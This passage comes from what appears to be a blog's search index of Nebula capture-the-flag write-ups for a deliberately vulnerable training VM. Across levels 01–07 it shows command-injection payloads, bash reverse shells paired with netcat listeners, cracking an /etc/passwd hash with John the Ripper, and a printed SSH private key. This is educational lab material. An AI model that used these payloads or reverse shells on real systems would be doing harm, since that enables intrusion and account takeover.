user=flag07 ⇒ The web service is running with our target account!⇒ We have to inject getflag for our webserver on port 7007 using index.cgi (the perl script).Let’s do it!!!level07@nebula:/home/flag07$ wget http://127.0.0.1:7007/index.cgi?Host=%3Bgetflag--2017-10-06 04:25:18-- http://127.0.0.1:7007/index.cgi?Host=%3BgetflagConnecting to 127.0.0.1:7007... connected.HTTP request sent, awaiting response... 200 OKLength: unspecified [text/html]index.cgi?Host=;getflag: Permission deniedCannot write to `index.cgi?Host=;getflag' (Permission denied).level07@nebula:/home/flag07$Well in the above command I am using wget (Web Get) to retrieve the response in html from my web server on localhost port 7007. But, I am trying to write in the wrong folder. The grand final:level07@nebula:/home/flag07$ cd ~level07@nebula:~$ wget http://127.0.0.1:7007/index.cgi?Host=%3Bgetflag--2017-10-24 07:40:31-- http://127.0.0.1:7007/index.cgi?Host=%3BgetflagConnecting to 127.0.0.1:7007... connected.HTTP request sent, awaiting response... 200 OKLength: unspecified [text/html]Saving to: `index.cgi?Host=;getflag' [ &lt;=&gt; ] 136 --.-K/s in 0.006s2017-10-24 07:40:31 (22.7 KB/s) - `index.cgi?Host=;getflag' saved [136]level07@nebula:~$ ls -altotal 11drwxr-x--- 1 level07 level07 80 Oct 24 07:40 .drwxr-xr-x 1 root root 80 Aug 27 2012 ..-rw-r--r-- 1 level07 level07 220 May 18 2011 .bash_logout-rw-r--r-- 1 level07 level07 3353 May 18 2011 .bashrcdrwx------ 2 level07 level07 60 Oct 24 07:38 .cache-rw------- 1 level07 level07 41 Aug 18 2012 .lesshst-rw-r--r-- 1 level07 level07 675 May 18 2011 .profile-rw------- 1 level07 level07 711 Aug 18 2012 .viminfo-rw-rw-r-- 1 level07 level07 77 Aug 18 2012 index.cgi-rw-rw-r-- 1 level07 level07 136 Oct 24 07:40 index.cgi?Host=;getflaglevel07@nebula:~$ cat index.cgi\\?Host\\=\\;getflag&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;You have successfully executed getflag on a target account&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;level07@nebula:~$" }, { "title": "Exploit Exercises: Nebula Level 06", "url": "/nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-06/", "categories": "nebula, writeups", "tags": "nebula, writeups, level, exploit, exercise, tutorial, solution", "date": "2018-07-16 21:48:00 +0300", "snippet": "The flag06 account credentials came from a legacy unix system.To do this level, log in as the level06 account with the password level06. Files for this level can be found in /home/flag06.Source cod...", "content": "The flag06 account credentials came from a legacy unix system.To do this level, log in as the level06 account with the password level06. Files for this level can be found in /home/flag06.Source codeThere is no source code available for this level.SolutionWell this exercises is so easy that I do not know why am I writing it anymore. Our first, and final hint, was: “The flag06 account credentials came from a legacy unix system.” In other words let’s see what we have in /etc/passwd or /etc/shadow./etc/shadow:level06@nebula:~$ cat /etc/shadowcat: /etc/shadow: Permission deniedlevel06@nebula:~$Of course, we do not have any kind of permission on /etc/shadow system file./etc/passwd:level06@nebula:~$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/bin/shman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var/spool/lpd:/bin/shmail:x:8:8:mail:/var/mail:/bin/shnews:x:9:9:news:/var/spool/news:/bin/shuucp:x:10:10:uucp:/var/spool/uucp:/bin/shproxy:x:13:13:proxy:/bin:/bin/shwww-data:x:33:33:www-data:/var/www:/bin/shbackup:x:34:34:backup:/var/backups:/bin/shlist:x:38:38:Mailing List Manager:/var/list:/bin/shirc:x:39:39:ircd:/var/run/ircd:/bin/shgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/shnobody:x:65534:65534:nobody:/nonexistent:/bin/shlibuuid:x:100:101::/var/lib/libuuid:/bin/shsyslog:x:101:103::/home/syslog:/bin/falsemessagebus:x:102:104::/var/run/dbus:/bin/falsenebula:x:1000:1000:nebula,,,:/home/nebula:/bin/bashsshd:x:103:65534::/var/run/sshd:/usr/sbin/nologinlevel00:x:1001:1001::/home/level00:/bin/shflag00:x:999:999::/home/flag00:/bin/shlevel01:x:1002:1002::/home/level01:/bin/shflag01:x:998:998::/home/flag01:/bin/shlevel02:x:1003:1003::/home/level02:/bin/shflag02:x:997:997::/home/flag02:/bin/shlevel03:x:1004:1004::/home/level03:/bin/shflag03:x:996:996::/home/flag03:/bin/shlevel04:x:1005:1005::/home/level04:/bin/shflag04:x:995:995::/home/flag04:/bin/shlevel05:x:1006:1006::/home/level05:/bin/shflag05:x:994:994::/home/flag05:/bin/shlevel06:x:1007:1007::/home/level06:/bin/shflag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/shlevel07:x:1008:1008::/home/level07:/bin/shflag07:x:992:992::/home/flag07:/bin/shlevel08:x:1009:1009::/home/level08:/bin/shflag08:x:991:991::/home/flag08:/bin/shlevel09:x:1010:1010::/home/level09:/bin/shflag09:x:990:990::/home/flag09:/bin/shlevel10:x:1011:1011::/home/level10:/bin/shflag10:x:989:989::/home/flag10:/bin/shlevel11:x:1012:1012::/home/level11:/bin/shflag11:x:988:988::/home/flag11:/bin/shlevel12:x:1013:1013::/home/level12:/bin/shflag12:x:987:987::/home/flag12:/bin/shlevel13:x:1014:1014::/home/level13:/bin/shflag13:x:986:986::/home/flag13:/bin/shlevel14:x:1015:1015::/home/level14:/bin/shflag14:x:985:985::/home/flag14:/bin/shlevel15:x:1016:1016::/home/level15:/bin/shflag15:x:984:984::/home/flag15:/bin/shlevel16:x:1017:1017::/home/level16:/bin/shflag16:x:983:983::/home/flag16:/bin/shlevel17:x:1018:1018::/home/level17:/bin/shflag17:x:982:982::/home/flag17:/bin/shlevel18:x:1019:1019::/home/level18:/bin/shflag18:x:981:981::/home/flag18:/bin/shlevel19:x:1020:1020::/home/level19:/bin/shflag19:x:980:980::/home/flag19:/bin/shlevel06@nebula:~$Jakpot! We got “flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh”, meaning we got the hash of the password of the flag06 account. How we actually retrieve the password of the flag06 account? Simple:nli@mysystem:~$ sudo apt install johnFetched 4.447 kB in 2s (1.649 kB/s)Selecting previously unselected package john-data.(Reading database ... 407903 files and directories currently installed.)Preparing to unpack .../john-data_1.8.0-2_all.deb ...Unpacking john-data (1.8.0-2) ...Selecting previously unselected package john.Preparing to unpack .../john_1.8.0-2_amd64.deb ...Unpacking john (1.8.0-2) ...Processing triggers for man-db (2.7.5-1) ...Setting up john-data (1.8.0-2) ...Setting up john (1.8.0-2) ...nli@mysystem:~$ echo 'flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh' &gt; ./flag06.passwdnli@mysystem:~$ john ./flag06.passwdCreated directory: /home/nli/.johnLoaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2-16])Press 'q' or Ctrl-C to abort, almost any other key for statushello (flag06)1g 0:00:00:00 100% 2/3 33.33g/s 25100p/s 25100c/s 25100C/s 123456..marleyUse the \"--show\" option to display all of the cracked passwords reliablySession completednli@mysystem:~$Amazing the password was so strong. It took me 0:00:00:00 seconds to both guess, hash my guessed password and check my hash with the provided hash. As we can see the password is “hello”. For the grand final:level06@nebula:~$ ssh flag06@localhostThe authenticity of host 'localhost (127.0.0.1)' can't be established.ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added 'localhost' (ECDSA) to the list of known hosts. _ __ __ __ / | / /__ / /_ __ __/ /___ _ / |/ / _ \\/ __ \\/ / / / / __ `/ / /| / __/ /_/ / /_/ / / /_/ / /_/ |_/\\___/_.___/\\__,_/_/\\__,_/ exploit-exercises.com/nebulaFor level descriptions, please see the above URL.To log in, use the username of \"levelXX\" and password \"levelXX\", whereXX is the level number.Currently there are 20 levels (00 - 19).flag06@localhost's password:Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686) * Documentation: https://help.ubuntu.com/New release '12.04 LTS' available.Run 'do-release-upgrade' to upgrade to it.The programs included with the Ubuntu system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law.flag06@nebula:~$ getflagYou have successfully executed getflag on a target accountflag06@nebula:~$If you enjoyed this tutorial then share and like!" }, { "title": "Exploit Exercises: Nebula Level 05", "url": "/nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-05/", "categories": "nebula, writeups", "tags": "nebula, writeups, level, exploit, exercise, tutorial, solution", "date": "2018-07-16 21:48:00 +0300", "snippet": "Check the flag05 home directory. You are looking for weak directory permissionsTo do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/...", "content": "Check the flag05 home directory. You are looking for weak directory permissionsTo do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05.Source codeThere is no source code available for this level.SolutionOf course we are going to login and go to the flag account folder, but we will be surprised to see this!level05@nebula:/home/flag05$ ls -altotal 5drwxr-x--- 4 flag05 level05 93 Aug 18 2012 .drwxr-xr-x 1 root root 80 Aug 27 2012 ..drwxr-xr-x 2 flag05 flag05 42 Nov 20 2011 .backup-rw-r--r-- 1 flag05 flag05 220 May 18 2011 .bash_logout-rw-r--r-- 1 flag05 flag05 3353 May 18 2011 .bashrc-rw-r--r-- 1 flag05 flag05 675 May 18 2011 .profiledrwx------ 2 flag05 flag05 70 Nov 20 2011 .sshlevel05@nebula:/home/flag05$Well under our flag folder we have nothing that we can use. Nada! Yet still we have our flag straight under your nose! The best hint for this challenge is “You are looking for weak directory permissions”. So if we run this command:level05@nebula:/home/flag05$ ls -lAhtotal 5.0Kdrwxr-xr-x 2 flag05 flag05 42 Nov 20 2011 .backup-rw-r--r-- 1 flag05 flag05 220 May 18 2011 .bash_logout-rw-r--r-- 1 flag05 flag05 3.3K May 18 2011 .bashrc-rw-r--r-- 1 flag05 flag05 675 May 18 2011 .profiledrwx------ 2 flag05 flag05 70 Nov 20 2011 .sshlevel05@nebula:/home/flag05$Or just this:level05@nebula:/home/flag05$ ls -al /home/flag05/total 5drwxr-x--- 4 flag05 level05 93 Aug 18 2012 .drwxr-xr-x 1 root root 80 Aug 27 2012 ..drwxr-xr-x 2 flag05 flag05 42 Nov 20 2011 .backup-rw-r--r-- 1 flag05 flag05 220 May 18 2011 .bash_logout-rw-r--r-- 1 flag05 flag05 3353 May 18 2011 .bashrc-rw-r--r-- 1 flag05 flag05 675 May 18 2011 .profiledrwx------ 2 flag05 flag05 70 Nov 20 2011 .sshlevel05@nebula:/home/flag05$We will observe a hidden folder called “.backup” with the permissions drwxr-xr-x. All fine let’s see what is in it!level05@nebula:/home/flag05/.backup$ tar -xzvf backup-19072011.tgz.ssh/tar: .ssh: Cannot mkdir: Permission denied.ssh/id_rsa.pubtar: .ssh: Cannot mkdir: Permission deniedtar: .ssh/id_rsa.pub: Cannot open: No such file or directory.ssh/id_rsatar: .ssh: Cannot mkdir: Permission deniedtar: .ssh/id_rsa: Cannot open: No such file or directory.ssh/authorized_keystar: .ssh: Cannot mkdir: Permission deniedtar: .ssh/authorized_keys: Cannot open: No such file or directorytar: Exiting with failure status due to previous errorslevel05@nebula:/home/flag05/.backup$ ls -altotal 2drwxr-xr-x 2 flag05 flag05 42 Nov 20 2011 .drwxr-x--- 4 flag05 level05 93 Aug 18 2012 ..-rw-rw-r-- 1 flag05 flag05 1826 Nov 20 2011 backup-19072011.tgzlevel05@nebula:/home/flag05/.backup$Uuuuuuuuuuuu, permission denied at “tar -xzvf backup-19072011.tgz” command! Nope. Let’s move it to another folder that we control (~/ or /tmp) and let’s unzip the tgz.level05@nebula:/home/flag05/.backup$ cp backup-19072011.tgz ~/level05@nebula:/home/flag05/.backup$ cd ~/level05@nebula:~$ lsbackup-19072011.tgzlevel05@nebula:~$ ls -altotal 9drwxr-x--- 1 level05 level05 80 Oct 18 12:43 .drwxr-xr-x 1 root root 80 Aug 27 2012 ..-rw-r--r-- 1 level05 level05 220 May 18 2011 .bash_logout-rw-r--r-- 1 level05 level05 3353 May 18 2011 .bashrcdrwx------ 2 level05 level05 60 Oct 18 12:27 .cache-rw-r--r-- 1 level05 level05 675 May 18 2011 .profiledrwx------ 2 level05 level05 3 Aug 27 2012 .ssh-rw-rw-r-- 1 level05 level05 1826 Oct 18 12:43 backup-19072011.tgzlevel05@nebula:~$ mkdir ./testlevel05@nebula:~$ tar -xvzf backup-19072011.tgz -C ./test.ssh/.ssh/id_rsa.pub.ssh/id_rsa.ssh/authorized_keyslevel05@nebula:~$Fun time. I’ve seen peoples trying to get the SSH key and to find the password in order to connect to the flag account in order to execute getflag to finish the task.You could try this also if you want to waste your time on this task.level05@nebula:~/test/.ssh$ ls -altotal 12drwxr-xr-x 2 level05 level05 100 Jul 19 2011 .drwxrwxr-x 3 level05 level05 60 Oct 18 12:44 ..-rw-r--r-- 1 level05 level05 394 Jul 19 2011 authorized_keys-rw------- 1 level05 level05 1675 Jul 19 2011 id_rsa-rw-r--r-- 1 level05 level05 394 Jul 19 2011 id_rsa.publevel05@nebula:~/test/.ssh$ cat ./id_rsa-----BEGIN RSA PRIVATE KEY-----MIIEowIBAAKCAQEAywCDXFL7nGpgxuT8y8ZYyzif565M6LexECfaRFl6ECQtP2Vpvns4RR0HeVFpZMD2dhQQ76sXXK4Jph0/xVRgYytF1hsCJLiedJ3+aWyRMYtkgvZDTDDD9lYGPzsb3FLqBocxCEpYJLruISY1YdzXpYgIBEVc8Sgq8Ur1uPMHAMYOL+b3Hga2upWO7vBU9g91SLB6IMyje+2doO5NqmPNgNLzqsPNnv4eiFy46WMAbq9K5tP7txhQdRxYZwMbhnJ+CLJ0EgXUAgdkvnjlGeD5okP61Eh7lbzHiws68SkflBvcw8KAsMF6TSXoQECRgoi9ycwTZy4xWspUqij+sY+3EQIDAQABAoIBAAGir2w+/ufzs3PmxGKf5nc8rY0gSl5VnIeUyp1iWylmITcxifiO5ZUo9rZzgXXeWB37a2eC6V1Fya4c7jaYx24FGzruXMYO9rfZzgLrbQAJL3YepcwnWGzTpJk90Kulv1zuGecHMk6ZcvGxbRysutAKmIXwSR9oQ3BOOkyTKKtI6YeKSnUNU1KVO1t//ps2wFcfXRFb17prpokx5clWwfUYRLBQlB4XjBIJ3tswpyC0PNOFfzoF+VeUlN9XZFrL0JWHX1F9DDOFJYL5bXw7zwhjEvZ0/qOvZSJiH4lkbmANsBeMNY/JOGV6T7dWthKBGehCnupeADZVaSeoQlysa0ECgYEA6x4FwgpeqNtNGeCcSAUtoviTYMD5LfMEpY8t9eGdRpzw1CDlmG9xk1LgzE3eA0qlJYx5NNqYEefIPVLdmSuSGS/5KqHeB8Ph7+WqLmguwIIIrfRJoPaDON2XqLU6YzAEazTrXnqALjOvP3qdN57xK0zoBAfYlkXJRgMYE1S23YsCgYEA3QhFFl11csPc2Yyz/7+9MG9JnOckYvuir+bf3fj/HEuIC9ylwXd4GfSLAW02Sg8DlfRhM7MxCW9OEWtKgUtHe3fGc6/6X1yF7QfeAYZm8UX/fo6PxuX++mvfPxM4i6vRjgzBQy8WisqTK9nLZO+hEdPoVqalz0iUsvu2umz0CVMCgYAsNoUWrCSI1FR3XUmGMZMXZm8wbpltDpn9GCOobTjKIpEXEuiZ9bsB3T/wq2Poco0DtprEWabnFxMMlRyexRbALclJPw8lnqxKFIIgH+9KvCktrRZ7cl/SvbjbPNkx9cGe92Cbb6XTCl0WLtSJtRXc8qVevKr59z2WMNbCK9gHaQKBgQDRaQNjpBohKFX2OytSU8uftuBMamV77iJ9e0SAHmc83IbBjkPwnwrHtHt6V4lG8yCXktgAznXYFX8mW7tT8gmAfcMkWgbhEFzGbFy2nyqqzoG42sJ3U/KWOVtifAhns9qvNYBo8ZTu2+xBcHAWaj31EQqgBfU0BPT0+ixuRcmThwKBgAi0ej7ylHhtwODQGghRmDpxEx9deJ0jilM2EnqIecJj5jnPW8BKDgV4Dc1QljBeCQ1r30DGYmOIazbhm+orm4df6HWPayRhNBlkmulqTs5GHvLMPjcKMB0k0Xna7QOtBAnzoHpLcrfvBdfRNE1eC87YkPUhmm5hBgG0+TeMmWgr-----END RSA PRIVATE KEY-----level05@nebula:~/test/.ssh$Or, you could also think that the .tgz file is called backup, so it might be the backup of this system and that it could also store the keys and passwords for ssh. In other smart words:level05@nebula:~/test/.ssh$ cp id_rsa /home/level05/.ssh/level05@nebula:~/test/.ssh$ ssh flag05@192.168.0.101 _ __ __ __ / | / /__ / /_ __ __/ /___ _ / |/ / _ \\/ __ \\/ / / / / __ `/ / /| / __/ /_/ / /_/ / / /_/ / /_/ |_/\\___/_.___/\\__,_/_/\\__,_/ exploit-exercises.com/nebulaFor level descriptions, please see the above URL.To log in, use the username of \"levelXX\" and password \"levelXX\", whereXX is the level number.Currently there are 20 levels (00 - 19).Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686) * Documentation: https://help.ubuntu.com/New release '12.04 LTS' available.Run 'do-release-upgrade' to upgrade to it.The programs included with the Ubuntu system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law.flag05@nebula:~$ iduid=994(flag05) gid=994(flag05) groups=994(flag05)flag05@nebula:~$ getflagYou have successfully executed getflag on a target accountflag05@nebula:~$Yes we do not need any password at all, just the private key of the SSH as the system knows already the system as a trusted one. Keep in mind: Be lazy!" }, { "title": "Exploit Exercises: Nebula Level 04", "url": "/nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-04/", "categories": "nebula, writeups", "tags": "nebula, writeups, level, exploit, exercise, tutorial, solution", "date": "2018-07-16 21:48:00 +0300", "snippet": "This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)To do this level, log in as the level04 account with the password level0...", "content": "This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04.Source code#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;int main(int argc, char **argv, char **envp){ char buf[1024]; int fd, rc; if(argc == 1) { printf(\"%s [file to read]\\n\", argv[0]); exit(EXIT_FAILURE); } if(strstr(argv[1], \"token\") != NULL) { printf(\"You may not access '%s'\\n\", argv[1]); exit(EXIT_FAILURE); } fd = open(argv[1], O_RDONLY); if(fd == -1) { err(EXIT_FAILURE, \"Unable to open %s\", argv[1]); } rc = read(fd, buf, sizeof(buf)); if(rc == -1) { err(EXIT_FAILURE, \"Unable to read fd %d\", fd); } write(1, buf, rc);}SolutionAfter login we go to the flag account folder.level04@nebula:~$ cd /home/flag04/level04@nebula:/home/flag04$ ls -altotal 13drwxr-x--- 2 flag04 level04 93 Nov 20 2011 .drwxr-xr-x 1 root root 80 Aug 27 2012 ..-rw-r--r-- 1 flag04 flag04 220 May 18 2011 .bash_logout-rw-r--r-- 1 flag04 flag04 3353 May 18 2011 .bashrc-rw-r--r-- 1 flag04 flag04 675 May 18 2011 .profile-rwsr-x--- 1 flag04 level04 7428 Nov 20 2011 flag04-rw------- 1 flag04 flag04 37 Nov 20 2011 tokenlevel04@nebula:/home/flag04$Hmm, let’s get more info by trying some basic commands.level04@nebula:/home/flag04$ ls -altotal 13drwxr-x--- 2 flag04 level04 93 Nov 20 2011 .drwxr-xr-x 1 root root 80 Aug 27 2012 ..-rw-r--r-- 1 flag04 flag04 220 May 18 2011 .bash_logout-rw-r--r-- 1 flag04 flag04 3353 May 18 2011 .bashrc-rw-r--r-- 1 flag04 flag04 675 May 18 2011 .profile-rwsr-x--- 1 flag04 level04 7428 Nov 20 2011 flag04-rw------- 1 flag04 flag04 37 Nov 20 2011 tokenlevel04@nebula:/home/flag04$ file flag04flag04: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, not strippedlevel04@nebula:/home/flag04$ ./flag04./flag04 [file to read]level04@nebula:/home/flag04$ cat tokencat: token: Permission deniedlevel04@nebula:/home/flag04$ ./flag04 tokenYou may not access 'token'level04@nebula:/home/flag04$Permission denied. Really? Nope. Where do we control everything as any user? Well …​ In /tmp/ folder and as we did in previous tutorials hard link are hard link!level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/level04level04@nebula:/home/flag04$ ls -la /tmptotal 0drwxrwxrwt 4 root root 100 Oct 16 13:18 .drwxr-xr-x 1 root root 220 Oct 16 2017 ..drwxrwxrwt 2 root root 40 Oct 16 2017 .ICE-unixdrwxrwxrwt 2 root root 40 Oct 16 2017 .X11-unixlrwxrwxrwx 1 level04 level04 18 Oct 16 13:17 level04 -&gt; /home/flag04/tokenlevel04@nebula:/home/flag04$That funny moment when you see the “lrwxrwxrwx” as permission for your hard link. Let’s end this.level04@nebula:/home/flag04$ ./flag04 /tmp/level0406508b5e-8909-4f38-b630-fdb148a848a2level04@nebula:/home/flag04$Now keep in mind that tokens in this exploit tutorial are used as passwords for the flag account.level04@nebula:/home/flag04$ su flag04Password:sh-4.2$ iduid=995(flag04) gid=995(flag04) groups=995(flag04)sh-4.2$ getflagYou have successfully executed getflag on a target accountsh-4.2$See you in the next tutorial. Share, Like and ask!" }, { "title": "Exploit Exercises: Nebula Level 03", "url": "/nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-03/", "categories": "nebula, writeups", "tags": "nebula, writeups, level, exploit, exercise, tutorial, solution", "date": "2018-07-16 21:48:00 +0300", "snippet": "Check the home directory of flag03 and take note of the files there.There is a crontab that is called every couple of minutes.To do this level, log in as the level03 account with the password level...", "content": "Check the home directory of flag03 and take note of the files there.There is a crontab that is called every couple of minutes.To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.Source codeThere is no source code available for this levelSolutionLet’s jump in!level03@nebula:/home/flag03$ ls -altotal 6drwxr-x--- 3 flag03 level03 103 Nov 20 2011 .drwxr-xr-x 1 root root 80 Aug 27 2012 ..-rw-r--r-- 1 flag03 flag03 220 May 18 2011 .bash_logout-rw-r--r-- 1 flag03 flag03 3353 May 18 2011 .bashrc-rw-r--r-- 1 flag03 flag03 675 May 18 2011 .profiledrwxrwxrwx 2 flag03 flag03 3 Aug 18 2012 writable.d-rwxr-xr-x 1 flag03 flag03 98 Nov 20 2011 writable.shInteresting! Let’s get more info about the task.level03@nebula:/home/flag03$ cat writable.sh#!/bin/shfor i in /home/flag03/writable.d/* ; do\t(ulimit -t 5; bash -x \"$i\")\trm -f \"$i\"donelevel03@nebula:/home/flag03$ cd ./writable.d/level03@nebula:/home/flag03/writable.d$ ls -altotal 0drwxrwxrwx 2 flag03 flag03 3 Aug 18 2012 .drwxr-x--- 3 flag03 level03 103 Nov 20 2011 ..level03@nebula:/home/flag03/writable.d$We have been told from the beginning that there is a crontab that is called every couple of minutes. But what is a crontab?Wikipedia: The software utility Cron is a time-based job scheduler in Unix-like computer operating systems. People who set up and maintain software environments use cron to schedule jobs (commands or shell scripts) to run periodically at fixed times, dates, or intervals. It typically automates system maintenance or administration—though its general-purpose nature makes it useful for things like downloading files from the Internet and downloading email at regular intervals.We will assume that the crontab is executing the only script we have “writable.sh”. Let’s look again at the code:#!/bin/shfor i in /home/flag03/writable.d/* ; do\t(ulimit -t 5; bash -x \"$i\") (1)\trm -f \"$i\" (2)doneWell, simple! At line (1) we are executing a bash script and at line (2) we are removing that bash script from “/home/flag03/writable.d/*”. Fine, let’s get a shell!lucian@vm:~$ nc -nvlp 8080Listening on [0.0.0.0] (family 0, port 8080Now let’s prepare our script.level03@nebula:/home/flag03$ cd writable.d/level03@nebula:/home/flag03/writable.d$ echo \"bash -i &gt;&amp; /dev/tcp/192.168.0.104/8080 0&gt;&amp;1\" &gt; shell.shlevel03@nebula:/home/flag03/writable.d$ cat shell.shbash -i &gt;&amp; /dev/tcp/192.168.0.104/8080 0&gt;&amp;1Done. Now we wait for like 5 minutes to in order to get the crontab execution.lucian@vm:~$ nc -nvlp 8080Listening on [0.0.0.0] (family 0, port 8080)Connection from [192.168.0.100] port 8080 [tcp/*] accepted (family 2, sport 45702)bash: no job control in this shellflag03@nebula:~$ ididuid=996(flag03) gid=996(flag03) groups=996(flag03)flag03@nebula:~$ getflaggetflagYou have successfully executed getflag on a target accountflag03@nebula:~$See you in the next tutorial!" }, { "title": "Exploit Exercises: Nebula Level 02", "url": "/nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-02/", "categories": "nebula, writeups", "tags": "nebula, writeups, level, exploit, exercise, tutorial, solution", "date": "2018-07-16 21:36:00 +0300", "snippet": "There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?To do this level, log in as the level02 account with the password level02. Files for thi...", "content": "There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.Source code#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;int main(int argc, char **argv, char **envp){ char *buffer; gid_t gid; uid_t uid; gid = getegid(); uid = geteuid(); setresgid(gid, gid, gid); setresuid(uid, uid, uid); buffer = NULL; asprintf(&amp;buffer, \"/bin/echo %s is cool\", getenv(\"USER\")); printf(\"about to call system(\\\"%s\\\")\\n\", buffer); system(buffer);}SolutionAfter login we go to the flag account folder.level02@nebula:~$ cd /home/flag02/level02@nebula:/home/flag02$ lsFlag02This program is almost the same as the previous one but we can not simply link “/bin/echo” to “/bin/getflag” because of the path “/bin”. But on this line:asprintf(&amp;buffer, \"/bin/echo %s is cool\", getenv(\"USER\"));We can observe the “getenv” function which is making our lives easier. If you do not know what “getenv” dose then read the following: http://en.cppreference.com/w/cpp/utility/program/getenvSo let’s try the following export:level02@nebula:/home/flag02$ export USER=getflaglevel02@nebula:/home/flag02$At this moment the system variable $USER has the value of “getflag”. Let’s test:level02@nebula:/home/flag02$ export USER=getflaglevel02@nebula:/home/flag02$ echo $USERgetflagNow let’s run the application and see the output.level02@nebula:/home/flag02$ ./flag02about to call system(\"/bin/echo getflag is cool\")getflag is coollevel02@nebula:/home/flag02$We are controlling the value of $USER but we need to both ensure that we comment the command in order to execute our instructions. In C/C++ we can comment commands with the symbol “;”. So let’s do this:level02@nebula:/home/flag02$ export USER='; getflag;'level02@nebula:/home/flag02$ echo $USER; getflag;level02@nebula:/home/flag02$Now let’s execute:level02@nebula:/home/flag02$ ./flag02about to call system(\"/bin/echo ; getflag; is cool\")You have successfully executed getflag on a target accountsh: is: command not foundlevel02@nebula:/home/flag02$Funny thing is that “sh: is: command not found” means that the program is trying to execute system command “is”. Have you ever tried a reverse shell? Ok let’s take control of the user “flag02” because of this SUID vulnerable program.Steps for standard reverse shell:Attacker is listening to everything on a portThe target is connecting to the attacker IP on the port (either by standard command or by certain exploits for certain programs ⇒ SUID in our case)Attacker is sending back commands! ⇒ Reverse ShellNebula system (aka target):level02@nebula:/home/flag02$ iduid=1003(level02) gid=1003(level02) groups=1003(level02)level02@nebula:/home/flag02$⇒ I am logged in as user “level02”My system (aka attacker) is starting the listening procedure:lucian@vm:~$ nc -l -p 8080 -vvvListening on [0.0.0.0] (family 0, port 8080)Nebula system (aka target) is making the exploit:level02@nebula:/home/flag02$ export USER='; bash -i &gt;&amp; /dev/tcp/192.168.0.104/8080 0&gt;&amp;1;'In other words this is a standard reverse shell command using bash. It could be decrypted as:bash -i &gt;&amp; /dev/tcp/&lt;attcker ip address&gt;/&lt;port that the attacker is listening on&gt; 0&gt;&amp;1Nebula system (aka target) is running the exploit:level02@nebula:/home/flag02$ ./flag02about to call system(\"/bin/echo ; bash -i &gt;&amp; /dev/tcp/192.168.0.104/8080 0&gt;&amp;1; is cool\")At this point my system (aka attacker) can execute commands as “flag02” and not as “level02” from my system (aka attacker) terminal!lucian@vm:~$ nc -l -p 8080 -vvvListening on [0.0.0.0] (family 0, port 8080)Connection from [192.168.0.101] port 8080 [tcp/http-alt] accepted (family 2, sport 55773)flag02@nebula:/home/flag02$ ididuid=997(flag02) gid=1003(level02) groups=997(flag02),1003(level02)flag02@nebula:/home/flag02$ getflaggetflagYou have successfully executed getflag on a target accountflag02@nebula:/home/flag02$" }, { "title": "Exploit Exercises: Nebula Level 01", "url": "/nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-01/", "categories": "nebula, writeups", "tags": "nebula, writeups, level, exploit, exercise, tutorial, solution", "date": "2018-07-16 00:57:00 +0300", "snippet": "There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?To do this level, log in as the level01 account with the password level01. Files for thi...", "content": "There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.Source code#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;int main(int argc, char **argv, char **envp){ gid_t gid; uid_t uid; gid = getegid(); uid = geteuid(); setresgid(gid, gid, gid); setresuid(uid, uid, uid); system(\"/usr/bin/env echo and now what?\");}SolutionStraight after we connect we go to flag01 account folder.level01@nebula:~$ cd /home/flag01/level01@nebula:/home/flag01$ ls -altotal 13drwxr-x--- 2 flag01 level01 92 Nov 20 2011 .drwxr-xr-x 1 root root 80 Aug 27 2012 ..-rw-r--r-- 1 flag01 flag01 220 May 18 2011 .bash_logout-rw-r--r-- 1 